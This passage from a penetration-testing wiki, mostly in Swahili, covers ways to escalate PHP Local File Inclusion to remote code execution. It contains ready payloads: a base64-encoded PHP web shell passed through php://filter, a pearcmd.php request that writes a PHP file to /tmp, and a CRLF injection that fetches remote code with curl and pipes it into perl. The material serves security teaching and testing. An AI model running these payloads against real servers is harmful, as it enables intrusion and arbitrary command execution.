2. Baada ya injection, tumia LFI kupata logs za server kutoka _**/var/log/vsftpd.log**_.

### Kupitia php base64 filter (kutumia base64)

Kama inavyoonyeshwa katika [hii](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter hupuuza tu Non-base64. Unaweza kutumia hilo kupitisha ukaguzi wa extension ya faili: ikiwa utatoa base64 inayomalizika na ".php", itapuuza tu "." na itaongeza "php" kwenye base64. Hapa kuna mfano wa payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Kwa kutumia php filters (hakuna faili inahitajika)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explains that you can use **php filters to generate arbitrary content** as output. Which basically means that you can **generate arbitrary php code** for the include **without needing to write** it into a file.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Kwa kutumia segmentation fault

**Pakia** faili itakayohifadhiwa kama **ya muda** katika `/tmp`, kisha katika **ombi lile lile,** chochea **segmentation fault**, na kisha **temporary file won't be deleted** na unaweza kuitafuta.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Kwa kutumia Nginx temp file storage

If you found a **Local File Inclusion** and **Nginx** is running in front of PHP you might be able to obtain RCE with the following technique:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Kutumia PHP_SESSION_UPLOAD_PROGRESS

Ikiwa umepata **Local File Inclusion** hata kama **huna session** na `session.auto_start` ni `Off`. Ukitoa **`PHP_SESSION_UPLOAD_PROGRESS`** katika data ya **multipart POST**, PHP itaanzisha session kwa niaba yako. Unaweza kutumia hili kupata RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Kupitia upakiaji wa faili za muda kwenye Windows

Ikiwa umepata **Local File Inclusion** na server inaendesha kwenye **Windows** unaweza kupata RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Kupitia `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Ifuatayo inatumia CRLF vuln kupata RCE (kutoka [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Kupitia phpinfo() (file_uploads = on)

Ikiwa umepata **Local File Inclusion** na faili inayofichua **phpinfo()** yenye file_uploads = on unaweza kupata RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Kupitia compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Ikiwa umepata **Local File Inclusion** na unaweza **exfiltrate the path** ya faili ya muda LAKINI **server** inafanya **checking** kama **file to be included has PHP marks**, unaweza kujaribu **bypass that check** kwa kutumia hii **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Kupitia eternal waiting + bruteforce

Ikiwa unaweza kuabusu LFI ili **upload temporary files** na kufanya server **hang** utekelezaji wa PHP, unaweza kisha **brute force filenames during hours** kutafuta faili ya muda:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Kwa Fatal Error

Ikiwa unajumuisha yoyote ya faili `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Unahitaji kujumuisha ile ile mara 2 ili kusababisha kosa hilo).

**Sijui jinsi hili linavyoweza kuwa muhimu lakini linaweza kuwa.**\
_Hata ukisababisha PHP Fatal Error, PHP temporary files zilizopakiwa hufutwa._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## Marejeo

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
